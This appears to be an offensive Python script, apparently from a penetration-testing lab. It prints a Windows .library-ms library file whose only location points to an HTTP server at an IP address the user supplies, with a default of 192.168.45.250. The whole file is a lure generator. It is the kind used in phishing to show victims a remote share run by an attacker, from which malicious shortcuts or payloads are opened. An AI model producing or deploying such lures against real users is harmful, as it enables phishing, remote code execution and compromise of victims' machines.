import sys

def update_ip_in_xml(ip):
    xml_content = '''<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.250</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>'''

    # Replace the IP address in the <url> tag
    new_xml_content = xml_content.replace('http://192.168.45.250', f'http://{ip}')

    print(new_xml_content)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: python script.py <IP>")
        sys.exit(1)

    ip_address = sys.argv[1]
    update_ip_in_xml(ip_address)
